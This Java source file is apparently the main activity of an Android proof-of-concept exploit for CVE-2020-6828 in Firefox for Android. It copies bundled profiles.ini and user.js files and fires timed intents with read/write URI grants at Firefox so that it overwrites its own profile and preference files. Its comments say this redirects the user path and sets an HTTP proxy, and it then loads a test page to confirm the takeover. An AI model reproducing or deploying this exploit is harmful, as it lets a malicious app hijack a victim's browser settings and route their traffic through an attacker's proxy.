package com.cve.poc20206828;

import androidx.appcompat.app.AppCompatActivity;

import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.os.Environment;
import android.util.Log;
import android.view.View;
import android.widget.Button;

import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.util.Timer;
import java.util.TimerTask;

public class MainActivity extends AppCompatActivity {

    final static String TAG = "cve";
    Button mOpenURI;

    private void copyAssetsFile(){
        try {
            File aimProfiles = new File(this.getExternalCacheDir() + "/profiles.ini");
            File aimPrefs = new File(this.getExternalCacheDir() + "/user.js");
            FileOutputStream outProfiles = new FileOutputStream(aimProfiles);
            FileOutputStream outPrefs = new FileOutputStream(aimPrefs);

            InputStream inProfiles = this.getAssets().open("profiles.ini");
            InputStream inUserjs = this.getAssets().open("user.js");


            byte[] buffer = new byte[0x1000];
            int len = 0;

            while(true) {
                len = inProfiles.read(buffer);
                if(len <= 0) {  break;  }
                outProfiles.write(buffer, 0, len);
            }
            outProfiles.flush();
            outProfiles.close();

            while(true) {
                len = inUserjs.read(buffer);
                if(len <= 0) {  break;  }
                outPrefs.write(buffer, 0, len);
            }
            outPrefs.flush();
            outPrefs.close();

            Log.i(TAG, "finish file copy : " + this.getExternalCacheDir() + "/profiles.ini & user.js");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }


    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        copyAssetsFile();

        mOpenURI = findViewById(R.id.open_uri);
        mOpenURI.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                //overwrite profiles.ini at once to change the USER PATH
                new Timer().schedule(
                        new TimerTask() {
                            @Override
                            public void run() {
                                Intent intent = new Intent();
                                intent.setPackage("org.mozilla.firefox");

                                intent.setAction(Intent.ACTION_VIEW);
                                intent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION | Intent.FLAG_GRANT_WRITE_URI_PERMISSION);

                                intent.setDataAndType(Uri.parse("content://com.cve.poc20206828.file/profiles.ini"), "*/*");
                                startActivity(intent);
                            }
                        }, 500L );
                // overwrite prefs.js 5s later to change to preferences settings (proxy.http) of user (prefs.js)
                new Timer().schedule(
                        new TimerTask() {
                            @Override
                            public void run() {
                                Intent intent = new Intent();
                                intent.setPackage("org.mozilla.firefox");

                                intent.setAction(Intent.ACTION_VIEW);
                                intent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION | Intent.FLAG_GRANT_WRITE_URI_PERMISSION);

                                intent.setDataAndType(Uri.parse("content://com.cve.poc20206828.file/user.js"), "*/*");
                                startActivity(intent);
                            }
                        }, 5000L );
                // open www.baidu.com to test whether the attack is effective
                new Timer().schedule(
                        new TimerTask() {
                            @Override
                            public void run() {
                                Intent intent = new Intent();
                                intent.setPackage("org.mozilla.firefox");

                                intent.setAction(Intent.ACTION_VIEW);
                                intent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION | Intent.FLAG_GRANT_WRITE_URI_PERMISSION);

                                intent.setDataAndType(Uri.parse("https://www.baidu.com"), "*/*");
                                startActivity(intent);
                            }
                        }, 10000L );
            }
        });
    }
}